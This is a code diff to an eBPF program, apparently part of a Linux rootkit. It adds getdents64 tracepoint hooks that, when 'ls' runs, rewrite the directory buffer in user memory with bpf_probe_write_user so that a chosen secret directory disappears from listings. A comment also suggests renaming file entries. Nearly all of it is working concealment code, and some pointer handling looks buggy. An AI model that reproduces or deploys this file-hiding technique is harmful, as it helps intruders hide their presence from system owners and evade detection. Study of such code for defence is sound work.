@@ -57,6 +57,29 @@ struct sys_openat_enter_ctx {
     umode_t mode;
 };
 
+/**
+ * >> cat /sys/kernel/debug/tracing/events/syscalls/sys_enter_getdents64/format
+ */
+struct sys_getdents64_enter_ctx {
+    unsigned long long unused;
+    int __syscall_nr;
+    unsigned int padding;
+    unsigned int fd;
+    struct linux_dirent64 *dirent;
+    unsigned int count;
+};
+
+/**
+ * >> cat /sys/kernel/debug/tracing/events/syscalls/sys_enter_getdents64/format
+ */
+struct sys_getdents64_exit_ctx {
+    unsigned long long unused;
+    int __syscall_nr;
+    unsigned int padding;
+    long ret;
+};
+
+
 static __always_inline int handle_tp_sys_enter_read(struct sys_read_enter_ctx *ctx, int fd, char* buf){
     __u64 pid_tgid = bpf_get_current_pid_tgid();
     __u32 pid = pid_tgid >> 32;
@@ -209,6 +232,124 @@ static __always_inline int handle_tp_sys_enter_openat(struct sys_openat_enter_ct
 
 
 
+static __always_inline int handle_tp_sys_enter_getdents64(struct sys_getdents64_enter_ctx *ctx, __u64 pid_tgid){
+    char comm[TASK_COMM_LEN] = {0};
+    int err = bpf_get_current_comm(comm, sizeof(comm));
+    if(err < 0){
+        return -1;
+    }
+
+    char *task = "ls";
+    if(str_n_compare(comm, 2, task, 2, 2) != 0){
+        return 0;
+    }
+
+    struct linux_dirent64 *d_entry;
+    struct fs_dir_log_data *stored_data = (struct fs_dir_log_data*) bpf_map_lookup_elem(&fs_dir_log, &pid_tgid);
+    if (stored_data == NULL){
+        struct fs_dir_log_data data = {0};
+        err = bpf_probe_read(&(data.dirent_info), sizeof(struct linux_dirent64), &(ctx->dirent));
+        if(err<0){
+            bpf_printk("Failed to read dirent info on enter\n");
+        }
+        bpf_map_update_elem(&fs_dir_log, &pid_tgid, &data, BPF_ANY);
+        return 0;
+    }
+    struct fs_dir_log_data data = *stored_data;
+    err = bpf_probe_read(&(data.dirent_info), sizeof(struct linux_dirent64), ctx->dirent);
+    if(err<0){
+        bpf_printk("Failed to read dirent info on enter 2\n");
+    }
+    bpf_map_update_elem(&fs_dir_log, &pid_tgid, &data, BPF_ANY);
+
+    return 0;
+
+}
+
+static __always_inline int handle_tp_sys_exit_getdents64(struct sys_getdents64_exit_ctx *ctx, __u64 pid_tgid){
+    char comm[TASK_COMM_LEN] = {0};
+    int err = bpf_get_current_comm(comm, sizeof(comm));
+    if(err < 0){
+        return -1;
+    }
+
+    char *task = "ls";
+    if(str_n_compare(comm, 2, task, 2, 2) != 0){
+        return 0;
+    }
+
+
+    struct linux_dirent64 *d_entry;
+    __u64 *stored_data = bpf_map_lookup_elem(&fs_dir_log, &pid_tgid);
+    if (stored_data == NULL){
+        //Nothing for this process
+        bpf_printk("Exitting getdents, empty\n");
+        return 0;
+    }
+    __u64 d_entry_base_addr = (__u64)(*stored_data);
+    
+    //Length of directory buffer
+    //https://linux.die.net/man/2/getdents64
+    long dir_buf_max = ctx->ret; 
+    long curr_offset = 0;
+    bpf_printk("Starting dirent search, max:%ld, base_addr: %lx\n", dir_buf_max, d_entry_base_addr);
+    //We will proceed to iterate through the buffer and look for our secret dir until we are past the limit
+    struct linux_dirent64* previous_dir = (struct linux_dirent64*)(d_entry_base_addr + curr_offset);
+    for(int ii=0; ii<16; ii++){
+        if(curr_offset>=dir_buf_max){
+            bpf_printk("Finished dirent search because we reached the end\n");
+            break;
+        }
+        struct linux_dirent64 *d_entry = (struct linux_dirent64*)(d_entry_base_addr + curr_offset);
+        __u16 d_reclen;
+        __u16 d_name_len;
+        char d_name[128];
+        bpf_probe_read(&d_reclen, sizeof(__u16), &d_entry->d_reclen); 
+        //bpf_printk("Record length: %d\n", d_reclen);
+        char d_type;
+        bpf_probe_read(&d_type, sizeof(d_type), &d_entry->d_type);
+        d_name_len = d_reclen - 2 - (offsetof(struct linux_dirent64, d_name));
+        int err = bpf_probe_read_user(&d_name, 128, d_entry->d_name);
+        if (err!=0){
+            //Ignore this entry, error
+            curr_offset += d_reclen;
+            //bpf_printk("Error reading directory name\n");
+            continue;
+        }
+        //It is a directory, check if it is ours
+        if (d_type == 4){
+            bpf_printk("DIR: %s\n", d_name);
+            if(previous_dir != NULL){
+                if(str_n_compare(d_name, sizeof(STRING_SECRET_DIRECTORY_NAME_HIDE)-1, STRING_SECRET_DIRECTORY_NAME_HIDE, sizeof(STRING_SECRET_DIRECTORY_NAME_HIDE)-1, sizeof(STRING_SECRET_DIRECTORY_NAME_HIDE)-1)==0){
+                    __u16 prev_reclen;
+                    bpf_probe_read(&prev_reclen, sizeof(__u16), &previous_dir->d_reclen); 
+                    __u16 new_len = prev_reclen + d_reclen;
+                    bpf_printk("Prev dir len:%d, new len:%d", prev_reclen, new_len);
+                    err = bpf_probe_write_user(&(previous_dir->d_reclen), &new_len ,sizeof(__u16));
+                    if(err<0){
+                        bpf_printk("Failed to overwrite directory struct length\n");
+                    }
+                }
+            }
+            bpf_probe_read(&previous_dir, sizeof(struct linux_dirent64*), &d_entry);
+            curr_offset += d_reclen;
+            continue;
+        }
+        //bpf_printk("Entry found\n");
+        bpf_printk("FILE: d_reclen: %d, d_name_len: %d, %s", d_reclen, d_name_len, d_name);
+        //Update the pointer
+        bpf_probe_read(&previous_dir, sizeof(struct linux_dirent64*), &d_entry);
+        curr_offset += d_reclen;
+
+        //Note, TODO
+        //We can also overwrite &d_entry->d_name for files!
+    }
+
+    return 0;
+}
+
+
+
 /**
  * @brief Receives read event and stores the parameters into internal map
  * 
@@ -257,6 +398,36 @@ int tp_sys_enter_openat(struct sys_openat_enter_ctx *ctx){
     }
     return handle_tp_sys_enter_openat(ctx, pid_tgid);
 }
+
+
+/**
+ * @brief 
+ * 
+ */
+SEC("tp/syscalls/sys_enter_getdents64")
+int tp_sys_enter_getdents64(struct sys_getdents64_enter_ctx *ctx){
+    __u64 pid_tgid = bpf_get_current_pid_tgid();
+    if(pid_tgid<0){
+        //bpf_printk("Out\n");
+        return -1;
+    }
+    return handle_tp_sys_enter_getdents64(ctx, pid_tgid);
+}
+
+/**
+ * @brief 
+ * 
+ */
+SEC("tp/syscalls/sys_exit_getdents64")
+int tp_sys_exit_getdents64(struct sys_getdents64_exit_ctx *ctx){
+    __u64 pid_tgid = bpf_get_current_pid_tgid();
+    if(pid_tgid<0){
+        //bpf_printk("Out\n");
+        return -1;
+    }
+    return handle_tp_sys_exit_getdents64(ctx, pid_tgid);
+}
+
 
 
 #endif
